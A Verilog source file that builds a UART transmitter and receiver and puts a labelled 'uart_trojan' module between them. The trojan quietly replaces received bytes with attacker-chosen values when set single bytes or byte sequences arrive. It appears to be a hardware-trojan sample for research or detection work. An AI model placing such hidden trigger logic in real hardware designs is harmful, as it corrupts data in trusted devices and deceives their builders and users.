`timescale 1ns/1ps

// ============================================================
// UART TRANSMITTER
// ============================================================

module uart_tx #(
    parameter CLKS_PER_BIT = 5208
)(
    input clk,
    input reset,
    input tx_start,
    input [7:0] tx_data,
    output reg tx,
    output reg tx_busy,
    output reg tx_done
);

    localparam IDLE  = 2'd0,
               START = 2'd1,
               DATA  = 2'd2,
               STOP  = 2'd3;

    reg [1:0] state;
    reg [15:0] clk_count;
    reg [2:0] bit_index;
    reg [7:0] tx_shift;

    always @(posedge clk or negedge reset) begin
        if (!reset) begin
            state     <= IDLE;
            tx        <= 1'b1;
            tx_busy   <= 1'b0;
            tx_done   <= 1'b0;
            clk_count <= 0;
            bit_index <= 0;
            tx_shift  <= 0;
        end
        else begin
            tx_done <= 1'b0;

            case (state)

                IDLE: begin
                    tx        <= 1'b1;
                    tx_busy   <= 1'b0;
                    clk_count <= 0;
                    bit_index <= 0;

                    if (tx_start) begin
                        tx_shift <= tx_data;
                        tx       <= 1'b0;
                        tx_busy  <= 1'b1;
                        state    <= START;
                    end
                end

                START: begin
                    if (clk_count == CLKS_PER_BIT - 1) begin
                        clk_count <= 0;
                        bit_index <= 0;
                        tx        <= tx_shift[0];
                        state     <= DATA;
                    end
                    else begin
                        clk_count <= clk_count + 1;
                    end
                end

                DATA: begin
                    if (clk_count == CLKS_PER_BIT - 1) begin
                        clk_count <= 0;

                        if (bit_index == 7) begin
                            tx    <= 1'b1;
                            state <= STOP;
                        end
                        else begin
                            bit_index <= bit_index + 1;
                            tx <= tx_shift[bit_index + 1];
                        end
                    end
                    else begin
                        clk_count <= clk_count + 1;
                    end
                end

                STOP: begin
                    if (clk_count == CLKS_PER_BIT - 1) begin
                        clk_count <= 0;
                        tx_done   <= 1'b1;
                        tx_busy   <= 1'b0;
                        state     <= IDLE;
                    end
                    else begin
                        clk_count <= clk_count + 1;
                    end
                end

                default: state <= IDLE;

            endcase
        end
    end

endmodule


// ============================================================
// UART RECEIVER
// ============================================================

module uart_rx #(
    parameter CLKS_PER_BIT = 5208
)(
    input clk,
    input reset,
    input rx,
    output reg [7:0] rx_data,
    output reg rx_valid,
    output reg rx_busy,
    output reg rx_error
);

    localparam IDLE  = 2'd0,
               START = 2'd1,
               DATA  = 2'd2,
               STOP  = 2'd3;

    reg [1:0] state;
    reg [15:0] clk_count;
    reg [2:0] bit_index;
    reg [7:0] rx_shift;

    reg rx_sync1;
    reg rx_sync2;

    always @(posedge clk or negedge reset) begin
        if (!reset) begin
            rx_sync1 <= 1'b1;
            rx_sync2 <= 1'b1;
        end
        else begin
            rx_sync1 <= rx;
            rx_sync2 <= rx_sync1;
        end
    end

    always @(posedge clk or negedge reset) begin
        if (!reset) begin
            state     <= IDLE;
            clk_count <= 0;
            bit_index <= 0;
            rx_shift  <= 0;
            rx_data   <= 0;
            rx_valid  <= 0;
            rx_busy   <= 0;
            rx_error  <= 0;
        end
        else begin
            rx_valid <= 1'b0;
            rx_error <= 1'b0;

            case (state)

                IDLE: begin
                    rx_busy   <= 1'b0;
                    clk_count <= 0;
                    bit_index <= 0;

                    if (rx_sync2 == 1'b0) begin
                        rx_busy <= 1'b1;
                        state   <= START;
                    end
                end

                START: begin
                    if (clk_count == (CLKS_PER_BIT - 1)/2) begin
                        clk_count <= 0;

                        if (rx_sync2 == 1'b0) begin
                            state <= DATA;
                        end
                        else begin
                            state    <= IDLE;
                            rx_error <= 1'b1;
                        end
                    end
                    else begin
                        clk_count <= clk_count + 1;
                    end
                end

                DATA: begin
                    if (clk_count == CLKS_PER_BIT - 1) begin
                        clk_count <= 0;
                        rx_shift[bit_index] <= rx_sync2;

                        if (bit_index == 7) begin
                            state <= STOP;
                        end
                        else begin
                            bit_index <= bit_index + 1;
                        end
                    end
                    else begin
                        clk_count <= clk_count + 1;
                    end
                end

                STOP: begin
                    if (clk_count == CLKS_PER_BIT - 1) begin
                        clk_count <= 0;
                        rx_busy   <= 1'b0;
                        state     <= IDLE;

                        if (rx_sync2 == 1'b1) begin
                            rx_data  <= rx_shift;
                            rx_valid <= 1'b1;
                        end
                        else begin
                            rx_error <= 1'b1;
                        end
                    end
                    else begin
                        clk_count <= clk_count + 1;
                    end
                end

                default: state <= IDLE;

            endcase
        end
    end

endmodule


// ============================================================
// PARAMETERIZED TROJAN
// ============================================================

module uart_trojan #(
    parameter [7:0] TROJAN_SINGLE_INPUT  = 8'd94,
    parameter [7:0] TROJAN_SINGLE_OUTPUT = 8'd95,

    parameter [7:0] TROJAN_TWO_FIRST     = 8'd36,
    parameter [7:0] TROJAN_TWO_SECOND    = 8'd37,
    parameter [7:0] TROJAN_TWO_OUTPUT    = 8'd38,

    parameter [7:0] TROJAN_FOUR_FIRST    = 8'd5,
    parameter [7:0] TROJAN_FOUR_SECOND   = 8'd27,
    parameter [7:0] TROJAN_FOUR_THIRD    = 8'd49,
    parameter [7:0] TROJAN_FOUR_FOURTH   = 8'd21,
    parameter [7:0] TROJAN_FOUR_OUTPUT   = 8'd22
)(
    input clk,
    input reset,

    input [7:0] rx_data_in,
    input rx_valid_in,

    output reg [7:0] rx_data_out,
    output reg rx_valid_out
);

    reg [7:0] prev1;
    reg [7:0] prev2;
    reg [7:0] prev3;

    always @(posedge clk or negedge reset) begin
        if (!reset) begin
            prev1        <= 8'd0;
            prev2        <= 8'd0;
            prev3        <= 8'd0;
            rx_data_out  <= 8'd0;
            rx_valid_out <= 1'b0;
        end
        else begin
            rx_valid_out <= rx_valid_in;

            if (rx_valid_in) begin

                // Trojan 1: Single-byte trigger.

                if (rx_data_in == TROJAN_SINGLE_INPUT) begin
                    rx_data_out <= TROJAN_SINGLE_OUTPUT;
                end

                // Trojan 2: Two-byte sequence trigger.

                else if (
                    prev1 == TROJAN_TWO_FIRST &&
                    rx_data_in == TROJAN_TWO_SECOND
                ) begin
                    rx_data_out <= TROJAN_TWO_OUTPUT;
                end

                // Trojan 3: Four-byte sequence trigger.

                else if (
                    prev3 == TROJAN_FOUR_FIRST  &&
                    prev2 == TROJAN_FOUR_SECOND &&
                    prev1 == TROJAN_FOUR_THIRD  &&
                    rx_data_in == TROJAN_FOUR_FOURTH
                ) begin
                    rx_data_out <= TROJAN_FOUR_OUTPUT;
                end

                // No trigger: pass data unchanged.

                else begin
                    rx_data_out <= rx_data_in;
                end

                // History tracks ORIGINAL received input bytes.

                prev3 <= prev2;
                prev2 <= prev1;
                prev1 <= rx_data_in;

            end
        end
    end

endmodule


// ============================================================
// UART TOP MODULE WITH PARAMETERIZED TROJAN
// ============================================================

module uart_top #(
    parameter CLKS_PER_BIT = 5208,

    parameter [7:0] TROJAN_SINGLE_INPUT  = 8'd94,
    parameter [7:0] TROJAN_SINGLE_OUTPUT = 8'd95,

    parameter [7:0] TROJAN_TWO_FIRST     = 8'd36,
    parameter [7:0] TROJAN_TWO_SECOND    = 8'd37,
    parameter [7:0] TROJAN_TWO_OUTPUT    = 8'd38,

    parameter [7:0] TROJAN_FOUR_FIRST    = 8'd5,
    parameter [7:0] TROJAN_FOUR_SECOND   = 8'd27,
    parameter [7:0] TROJAN_FOUR_THIRD    = 8'd49,
    parameter [7:0] TROJAN_FOUR_FOURTH   = 8'd21,
    parameter [7:0] TROJAN_FOUR_OUTPUT   = 8'd22
)(
    input clk,
    input reset,
    input tx_start,
    input rx,
    input [7:0] tx_data,

    output tx,
    output tx_busy,
    output tx_done,

    output rx_valid,
    output rx_busy,
    output rx_error,
    output [7:0] rx_data
);

    wire [7:0] raw_rx_data;
    wire raw_rx_valid;

    uart_tx #(
        .CLKS_PER_BIT(CLKS_PER_BIT)
    ) transmitter (
        .clk(clk),
        .reset(reset),
        .tx_start(tx_start),
        .tx_data(tx_data),
        .tx(tx),
        .tx_busy(tx_busy),
        .tx_done(tx_done)
    );

    uart_rx #(
        .CLKS_PER_BIT(CLKS_PER_BIT)
    ) receiver (
        .clk(clk),
        .reset(reset),
        .rx(rx),
        .rx_data(raw_rx_data),
        .rx_valid(raw_rx_valid),
        .rx_busy(rx_busy),
        .rx_error(rx_error)
    );

    uart_trojan #(
        .TROJAN_SINGLE_INPUT(TROJAN_SINGLE_INPUT),
        .TROJAN_SINGLE_OUTPUT(TROJAN_SINGLE_OUTPUT),

        .TROJAN_TWO_FIRST(TROJAN_TWO_FIRST),
        .TROJAN_TWO_SECOND(TROJAN_TWO_SECOND),
        .TROJAN_TWO_OUTPUT(TROJAN_TWO_OUTPUT),

        .TROJAN_FOUR_FIRST(TROJAN_FOUR_FIRST),
        .TROJAN_FOUR_SECOND(TROJAN_FOUR_SECOND),
        .TROJAN_FOUR_THIRD(TROJAN_FOUR_THIRD),
        .TROJAN_FOUR_FOURTH(TROJAN_FOUR_FOURTH),
        .TROJAN_FOUR_OUTPUT(TROJAN_FOUR_OUTPUT)
    ) trojan (
        .clk(clk),
        .reset(reset),
        .rx_data_in(raw_rx_data),
        .rx_valid_in(raw_rx_valid),
        .rx_data_out(rx_data),
        .rx_valid_out(rx_valid)
    );

endmodule
